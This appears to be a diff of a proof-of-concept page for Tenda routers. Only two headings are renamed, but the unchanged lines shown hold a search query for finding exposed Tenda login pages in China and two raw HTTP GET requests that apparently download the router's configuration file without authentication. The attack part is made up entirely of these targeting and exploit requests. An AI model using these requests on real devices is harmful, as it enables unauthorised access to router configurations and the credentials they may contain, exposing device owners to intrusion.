@@ -5,7 +5,7 @@
 title="Tenda | LOGIN" && country="CN"
 ```
 
-## poc1
+## POC1
 ```
 GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
 Host: ip:port
@@ -18,7 +18,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 ```
 
-## poc2
+## POC2
 ```
 GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1
 Host: ip:port
